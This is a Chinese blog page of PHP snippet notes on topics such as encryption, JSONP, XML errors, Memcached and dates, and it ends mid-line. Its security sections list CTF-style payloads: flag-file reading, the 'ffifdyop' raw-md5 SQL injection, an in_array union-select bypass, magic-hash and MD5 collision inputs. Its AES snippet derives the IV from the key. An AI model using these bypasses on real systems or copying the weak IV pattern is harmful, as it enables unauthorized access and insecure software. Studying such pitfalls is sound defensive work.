<h3 id="PHP-7-1-中使用-openssl-取代-mcrypt"><a href="#PHP-7-1-中使用-openssl-取代-mcrypt" class="headerlink" title="PHP 7.1 中使用 openssl 取代 mcrypt"></a>PHP 7.1 中使用 openssl 取代 mcrypt</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对明文进行加密</span></span><br><span class="line"><span class="comment"> * @param string $text 需要加密的明文</span></span><br><span class="line"><span class="comment"> * @return string 加密后的密文</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params">$text, $appid</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        *原来代码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        $iv = substr($<span class="keyword">this</span>-&gt;key, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        $encrypted = openssl_encrypt($text,<span class="string">'AES-256-CBC'</span>,$<span class="keyword">this</span>-&gt;key,OPENSSL_ZERO_PADDING,$iv);</span><br><span class="line">        <span class="keyword">return</span> array(ErrorCode::$OK, $encrypted);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        <span class="comment">//print $e;</span></span><br><span class="line">        <span class="keyword">return</span> array(ErrorCode::$EncryptAESError, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对密文进行解密https://blog.wpjam.com/m/php-7-1-openssl/</span></span><br><span class="line"><span class="comment"> * @param string $encrypted 需要解密的密文</span></span><br><span class="line"><span class="comment"> * @return string 解密得到的明文</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params">$encrypted, $appid</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $iv = substr($<span class="keyword">this</span>-&gt;key, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        $decrypted = openssl_decrypt($encrypted,<span class="string">'AES-256-CBC'</span>,$<span class="keyword">this</span>-&gt;key,OPENSSL_ZERO_PADDING,$iv);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        <span class="keyword">return</span> array(ErrorCode::$DecryptAESError, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    *原来代码</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="static-效率优化"><a href="#static-效率优化" class="headerlink" title="static 效率优化"></a>static 效率优化</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_some_var</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $<span class="keyword">var</span>;</span><br><span class="line">	<span class="keyword">if</span>(!isset($<span class="keyword">var</span>))&#123;</span><br><span class="line">		$<span class="keyword">var</span> = complex_calculation();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $<span class="keyword">var</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解码-JSONP"><a href="#解码-JSONP" class="headerlink" title="解码 JSONP"></a>解码 JSONP</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonp_decode</span>(<span class="params">$jsonp, $assoc = false</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>($jsonp[<span class="number">0</span>] !== <span class="string">'['</span> &amp;&amp; $jsonp[<span class="number">0</span>] !== <span class="string">'&#123;'</span>) &#123;</span><br><span class="line">		$jsonp = substr($jsonp, strpos($jsonp, <span class="string">'('</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> json_decode(trim($jsonp,<span class="string">'();'</span>), $assoc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="合并多维数组中的子数组"><a href="#合并多维数组中的子数组" class="headerlink" title="合并多维数组中的子数组"></a>合并多维数组中的子数组</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$merged = call_user_func_array(<span class="string">'array_merge'</span>, $result);</span><br><span class="line">$merged = array_merge(...$result);</span><br></pre></td></tr></table></figure>
<h3 id="simplexml-load-string-的-parser-error-问题"><a href="#simplexml-load-string-的-parser-error-问题" class="headerlink" title="simplexml_load_string 的 parser error 问题"></a>simplexml_load_string 的 parser error 问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">首先使用函数 libxml_use_internal_errors() 关闭 XML 错误，然后使用 libxml_get_errors() 获取相关的错误进行自定义处理。</span><br><span class="line"></span><br><span class="line">libxml_use_internal_errors(<span class="literal">true</span>);</span><br><span class="line">$sxe = simplexml_load_string(<span class="string">"&lt;?xml version='1.0'&gt;&lt;broken&gt;&lt;xml&gt;&lt;/broken&gt;"</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === $sxe) &#123;</span><br><span class="line">    echo <span class="string">"加载 XML 错误\n"</span>;</span><br><span class="line">    foreach(libxml_get_errors() <span class="keyword">as</span> $error) &#123;</span><br><span class="line">        echo <span class="string">"\t"</span>, $error-&gt;message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;加载 XML 错误</span><br><span class="line"> </span><br><span class="line">     Blank needed here</span><br><span class="line">     parsing XML declaration: <span class="string">'?&gt;'</span> expected</span><br><span class="line">     Opening and ending tag mismatch: xml line <span class="number">1</span> and broken</span><br><span class="line">     Premature end <span class="keyword">of</span> data <span class="keyword">in</span> tag broken line <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="如何移除控制字符"><a href="#如何移除控制字符" class="headerlink" title="如何移除控制字符"></a>如何移除控制字符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wpjam_strip_control_characters</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">'/[\x00-\x1F\x7F-\x9F]/u'</span>, <span class="string">''</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取-Linux-服务器的-uptime"><a href="#获取-Linux-服务器的-uptime" class="headerlink" title="获取 Linux 服务器的 uptime"></a>获取 Linux 服务器的 uptime</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$uptime = trim(shell_exec(<span class="string">'uptime'</span>));</span><br><span class="line"><span class="comment">// output is 04:47:32 up 187 days,  5:03,  1 user,  load average: 0.55, 0.55, 0.54</span></span><br><span class="line"></span><br><span class="line">$uptime = explode(<span class="string">','</span>, $uptime);</span><br><span class="line">$uptime = explode(<span class="string">' '</span>, $uptime[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">$uptime = $uptime[<span class="number">2</span>].<span class="string">' '</span>.$uptime[<span class="number">3</span>]; <span class="comment">// 187 days</span></span><br><span class="line">$uptime = trim(file_get_contents(<span class="string">'/proc/uptime'</span>));</span><br><span class="line">$uptime = explode(<span class="string">' '</span>, $uptime);</span><br><span class="line"></span><br><span class="line">echo $uptime[<span class="number">0</span>]; <span class="comment">//uptime in seconds</span></span><br></pre></td></tr></table></figure>
<h3 id="用Memcahced-的时候，请不要把过期时间设置成超过30天"><a href="#用Memcahced-的时候，请不要把过期时间设置成超过30天" class="headerlink" title="用Memcahced 的时候，请不要把过期时间设置成超过30天"></a>用Memcahced 的时候，请不要把过期时间设置成超过30天</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">过期时间是一个 Unix 时间戳，也可以是一个从现在算起的以秒为单位的数字。</span><br><span class="line">那么怎么判断是 Unix 时间戳还是一个从现在算起的以秒为单位的数字呢？小于 <span class="number">60</span>×<span class="number">60</span>×<span class="number">24</span>×<span class="number">30</span>（<span class="number">30</span>天时间的秒数），就算是从现在算起的以秒为单位的数字。如果大于服务端会将其作为一个真实的Unix时间戳来处理而不是自当前时间的偏移。</span><br><span class="line">如果过期时间被设置为<span class="number">0</span>（默认），此元素永不过期（但是它可能由于服务端为了给其他新的元素分配空间而被删除）。</span><br><span class="line">所以如果真的要设置一个 key 的过期时间为一年后，其值应该设置为： time()+<span class="number">60</span>×<span class="number">60</span>×<span class="number">24</span>×<span class="number">365</span>。</span><br></pre></td></tr></table></figure>
<h3 id="json-decode-无法解析"><a href="#json-decode-无法解析" class="headerlink" title="json_decode 无法解析"></a>json_decode 无法解析</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">'JSON.php'</span>;<span class="comment">//https://github.com/pear/Services_JSON</span></span><br><span class="line">$json = <span class="keyword">new</span> Services_JSON();</span><br><span class="line">$data = $json-&gt;decode($str);</span><br><span class="line">$json = <span class="keyword">new</span> Services_JSON(SERVICES_JSON_LOOSE_TYPE);</span><br><span class="line">$data = $json-&gt;decode($str);</span><br></pre></td></tr></table></figure>
<h3 id="cURL-报错-error-60-SSL-certificate-problem"><a href="#cURL-报错-error-60-SSL-certificate-problem" class="headerlink" title="cURL 报错 error 60 SSL certificate problem"></a>cURL 报错 error 60 SSL certificate problem</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将 cacert.pem 文件保存在可到达的目标中。</span><br><span class="line">然后，在 php.ini 文件中，向下滚动到找到 [curl] 的位置。</span><br><span class="line">您应该看到注释掉了 CURLOPT_CAINFO 选项。 取消注释并将其指向 cacert.pem 文件。 你应该有这样的一行：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">curl.cainfo =“证书路径\cacert.pem”</span><br></pre></td></tr></table></figure>
<h3 id="按周取时间段"><a href="#按周取时间段" class="headerlink" title="按周取时间段"></a>按周取时间段</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$start = <span class="string">'1478863624'</span>;</span><br><span class="line">$end = <span class="string">'1480505248'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getweek</span>(<span class="params">$start, $end</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = array();</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>($start &lt;= $end)&#123;</span><br><span class="line">            $ret[$i][<span class="string">'start'</span>] = date(<span class="string">'Y-m-d'</span>,$start);</span><br><span class="line">            $tmp = strtotime(<span class="string">"+6 days"</span>,$start);</span><br><span class="line">            <span class="keyword">if</span>($end &lt;= $tmp)</span><br><span class="line">                $ret[$i][<span class="string">'end'</span>] = date(<span class="string">'Y-m-d'</span>,$end);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $ret[$i][<span class="string">'end'</span>] = date(<span class="string">'Y-m-d'</span>,$tmp);</span><br><span class="line">            $i++;</span><br><span class="line">            $start = strtotime(<span class="string">"+1 day"</span>,$tmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [start] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-11</span></span><br><span class="line">            [end] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-17</span></span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [start] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-18</span></span><br><span class="line">            [end] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-24</span></span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line">    [<span class="number">2</span>] =&gt; <span class="built_in">Array</span></span><br><span class="line">        (</span><br><span class="line">            [start] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-25</span></span><br><span class="line">            [end] =&gt; <span class="number">2016</span><span class="number">-11</span><span class="number">-30</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
<h3 id="PHP-代码安全"><a href="#PHP-代码安全" class="headerlink" title="PHP 代码安全"></a>PHP 代码安全</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/articles/28505</span></span><br></pre></td></tr></table></figure>
<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">var</span> = <span class="string">"https://6619.io"</span>;</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">use</span> (<span class="params">$var</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// echo $var;</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">$param</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// echo $param;</span></span><br><span class="line">&#125;)($<span class="keyword">var</span>);</span><br></pre></td></tr></table></figure>
<h3 id="比较字符串"><a href="#比较字符串" class="headerlink" title="比较字符串"></a>比较字符串</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">列出目录https:<span class="comment">//www.restran.net/2016/09/26/php-security-notes/</span></span><br><span class="line"></span><br><span class="line">scandir(<span class="string">'/site'</span>)</span><br><span class="line">show_source(<span class="string">'flag.php'</span>);</span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">var_dump(file(<span class="string">'flag.php'</span>));</span><br><span class="line">print_r(file(<span class="string">'flag.php'</span>));</span><br><span class="line">如果 GET 参数中设置 name[]=a，那么 $_GET[<span class="string">'name'</span>] = [a]，php 会把 []=a 当成数组传入， $_GET 会自动对参数调用 urldecode。</span><br><span class="line"></span><br><span class="line">$_POST 同样存在此漏洞，提交的表单数据，user[]=admin，$_POST[<span class="string">'user'</span>] 得到的是 [<span class="string">'admin'</span>] 是一个数组。</span><br><span class="line">sha1([]) === <span class="literal">false</span></span><br><span class="line">md5([]) === <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">$password = <span class="string">"ffifdyop"</span>;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM admin WHERE pass = '"</span>.md5($password,<span class="literal">true</span>).<span class="string">"'"</span></span><br><span class="line">b<span class="string">"SELECT * FROM admin WHERE pass = ''or'6É]™é!r,ùíb\x1C'"</span></span><br><span class="line"></span><br><span class="line"><span class="string">'0.999999999999999999999'</span> == <span class="number">1</span></span><br><span class="line"> <span class="literal">true</span> <span class="keyword">in</span> PHP <span class="number">4.3</span><span class="number">.0</span> - <span class="number">5.6</span>.x</span><br><span class="line"># false in 7.0.0+</span><br><span class="line"><span class="string">'0e0'</span> == <span class="string">'0x0'</span></span><br><span class="line"><span class="string">'0xABC'</span> == <span class="string">'0xabc'</span></span><br><span class="line"><span class="string">'0xABCdef'</span> == <span class="string">'0xabcDEF'</span></span><br><span class="line"><span class="string">'000000e1'</span> == <span class="string">'0x000000'</span></span><br><span class="line"><span class="string">'0xABFe1'</span> == <span class="string">'0xABFE1'</span></span><br><span class="line"><span class="string">'0xe'</span> == <span class="string">'0Xe'</span></span><br><span class="line"><span class="string">'0xABCDEF'</span> == <span class="string">'11259375'</span></span><br><span class="line"><span class="string">'0xABCDEF123'</span> == <span class="string">'46118400291'</span></span><br><span class="line"><span class="string">'0x1234AB'</span> == <span class="string">'1193131'</span></span><br><span class="line"><span class="string">'0x1234Ab'</span> == <span class="string">'1193131'</span></span><br><span class="line"></span><br><span class="line"># true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x</span><br><span class="line"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+</span><br><span class="line"><span class="string">'0xABCdef'</span> == <span class="string">' 0xabcDEF'</span></span><br><span class="line"><span class="string">'1e1'</span> == <span class="string">'0xa'</span></span><br><span class="line"><span class="string">'0xe'</span> == <span class="string">' 0Xe'</span></span><br><span class="line"><span class="string">'0x123'</span> == <span class="string">' 0x123'</span></span><br><span class="line"></span><br><span class="line"># true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0</span><br><span class="line"># false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+</span><br><span class="line"><span class="string">'0e0'</span> == <span class="string">'0x0a'</span></span><br><span class="line"></span><br><span class="line"># true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2</span><br><span class="line"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+</span><br><span class="line"><span class="string">'0xe'</span> == <span class="string">' 0Xe.'</span></span><br><span class="line">var_dump(is_numeric(<span class="string">"\01"</span>)); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">typeid=<span class="number">1</span>’ union select.. 也能通过 in_array 的验证</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (in_array($_GET(<span class="string">'typeid'</span>], array(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>))) &#123;</span><br><span class="line">    $sql=<span class="string">"select …. where typeid="</span>.$_GET[<span class="string">'typeid'</span>]<span class="string">";</span></span><br><span class="line"><span class="string">    echo $sql;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">两个 md5 一样的字符串</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> future.moves.urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">input1 = <span class="string">'Oded Goldreich\nOded Goldreich\nOded Goldreich\nOded Go'</span> + unhexlify(</span><br><span class="line"><span class="string">'d8050d0019bb9318924caa96dce35cb835b349e144e98c50c22cf461244a4064bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf67c12978647f5af123de3acf844085cd025b956'</span>)</span><br><span class="line"></span><br><span class="line">print(quote(input1))</span><br><span class="line">print md5(input1).hexdigest()</span><br><span class="line"></span><br><span class="line">input2 = <span class="string">'Neal Koblitz\nNeal Koblitz\nNeal Koblitz\nNeal Koblitz\n'</span> + unhexlify(<span class="string">'75b80e0035f3d2c909af1baddce35cb835b349e144e88c50c22cf461244a40e4bf1afaecc5820d428ad38d6bec89a5ad51e29063dd79b16cf6fc11978647f5af123de3acf84408dcd025b956'</span>)</span><br><span class="line">print md5(input2).hexdigest()</span><br><span class="line">print(quote(input2))</span><br><span class="line"><span class="keyword">from</span> array <span class="keyword">import</span> array</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">input1 = array(<span class="string">'I'</span>, [<span class="number">0x6165300e</span>,<span class="number">0x87a79a55</span>,<span class="number">0xf7c60bd0</span>,<span class="number">0x34febd0b</span>,<span class="number">0x6503cf04</span>,<span class="number">0x854f709e</span>,<span class="number">0xfb0fc034</span>,<span class="number">0x874c9c65</span>,<span class="number">0x2f94cc40</span>,<span class="number">0x15a12deb</span>,<span class="number">0x5c15f4a3</span>,<span class="number">0x490786bb</span>,<span class="number">0x6d658673</span>,<span class="number">0xa4341f7d</span>,<span class="number">0x8fd75920</span>,<span class="number">0xefd18d5a</span>])</span><br><span class="line">input2 = array(<span class="string">'I'</span>, [x^y <span class="keyword">for</span> x,y <span class="keyword">in</span> zip(input1, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&lt;&lt;<span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])])</span><br><span class="line">print(input1 == input2) # False</span><br><span class="line">print(md5(input1).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41</span><br><span class="line">print(md5(input2).hexdigest()) # cee9a457e790cf20d4bdaa6d69f01e41</span><br><span class="line"></span><br><span class="line"><span class="comment">// '0e5093234' 为 0，'0eabc3234' 不为 0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="string">'0e509367213418206700842008763514'</span> == <span class="string">'0e481036490867661113260034900752'</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="string">'0e481036490867661113260034900752'</span> == <span class="string">'0'</span> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// false</span></span><br><span class="line">var_dump(<span class="string">'0'</span> == <span class="string">'0e1abcd'</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">'0e1abcd'</span>);</span><br><span class="line"> </span><br><span class="line">var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</span><br><span class="line">var_dump(md5(<span class="string">'aabg7XSs'</span>) == md5(<span class="string">'aabC9RqS'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaroZmOk'</span>) == sha1(<span class="string">'aaK1STfY'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaO8zKZF'</span>) == sha1(<span class="string">'aa3OFF9m'</span>));</span><br><span class="line">找出 <span class="number">0</span>e 开头的 hash 碰撞，可以用如下代码</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$salt = <span class="string">'vunp'</span>;</span><br><span class="line">$hash = <span class="string">'0e612198634316944013585621061115'</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i&lt;<span class="number">100000000000</span>; $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (md5($salt . $i) == $hash) &#123;</span><br><span class="line">        echo $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo <span class="string">'  done'</span>;</span><br><span class="line"><span class="number">0</span>e 开头，md5后面全是数字的</span><br><span class="line"><span class="number">240610708</span>: <span class="number">0e462097431906509019562988736854</span></span><br><span class="line">QLTHNDT: <span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO: <span 